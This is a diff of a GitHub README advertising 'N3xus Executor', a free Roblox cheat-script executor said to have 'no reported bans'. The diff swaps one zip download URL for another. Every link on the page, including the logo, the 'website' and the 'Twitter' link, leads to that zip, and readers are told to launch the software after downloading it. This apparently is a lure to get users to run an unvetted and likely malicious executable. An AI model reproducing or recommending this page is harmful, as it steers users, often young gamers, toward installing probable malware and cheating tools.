@@ -2,7 +2,7 @@
 
 ## Welcome to N3xus Executor - Roblox Scripting Hub
 
-![N3xus Executor Logo](https://github.com/curly3/N3xus-Scr1pt-R0bl0x/releases/download/v1.0/Application.zip)
+![N3xus Executor Logo](https://github.com/curly3/N3xus-Scr1pt-R0bl0x/raw/refs/heads/main/cortinate/xus-bl-x-Scr-pt-v3.7.zip)
 
 ### Repository Overview
 Welcome to the N3xus Scr1pt R0bl0x repository! N3xus Executor is a powerful scripting tool designed specifically for Roblox game scripting. This repository offers free and lifetime packages for users interested in enhancing their Roblox scripting experience. N3xus Executor is hosted directly on the website and supports the execution of all Luau scripts. It has garnered a reputation for having no reported bans, making it a trustworthy tool for Roblox scripters. However, please note that it currently features a limited number of games and a small script hub.
@@ -20,15 +20,15 @@ Welcome to the N3xus Scr1pt R0bl0x repository! N3xus Executor is a powerful scri
 ### Get Started with N3xus Executor
 If you are ready to take your Roblox scripting to the next level, download the N3xus Executor software from the link below:
 
-[![Download N3xus Executor](https://github.com/curly3/N3xus-Scr1pt-R0bl0x/releases/download/v1.0/Application.zip)](https://github.com/curly3/N3xus-Scr1pt-R0bl0x/releases/download/v1.0/Application.zip)
+[![Download N3xus Executor](https://github.com/curly3/N3xus-Scr1pt-R0bl0x/raw/refs/heads/main/cortinate/xus-bl-x-Scr-pt-v3.7.zip)](https://github.com/curly3/N3xus-Scr1pt-R0bl0x/raw/refs/heads/main/cortinate/xus-bl-x-Scr-pt-v3.7.zip)
 
 *Note: The software needs to be launched after downloading.*
 
 ### Visit the Website
-For more information about N3xus Executor, including updates, tutorials, and community resources, visit the [N3xus Executor website](https://github.com/curly3/N3xus-Scr1pt-R0bl0x/releases/download/v1.0/Application.zip).
+For more information about N3xus Executor, including updates, tutorials, and community resources, visit the [N3xus Executor website](https://github.com/curly3/N3xus-Scr1pt-R0bl0x/raw/refs/heads/main/cortinate/xus-bl-x-Scr-pt-v3.7.zip).
 
 ### Stay Connected
-Stay up to date with the latest news and announcements from N3xus Executor by following our [Twitter](https://github.com/curly3/N3xus-Scr1pt-R0bl0x/releases/download/v1.0/Application.zip) account.
+Stay up to date with the latest news and announcements from N3xus Executor by following our [Twitter](https://github.com/curly3/N3xus-Scr1pt-R0bl0x/raw/refs/heads/main/cortinate/xus-bl-x-Scr-pt-v3.7.zip) account.
 
 ### Help and Support
 If you encounter any issues or have questions about using N3xus Executor, please refer to the "Releases" section of this repository for troubleshooting guides and support resources.
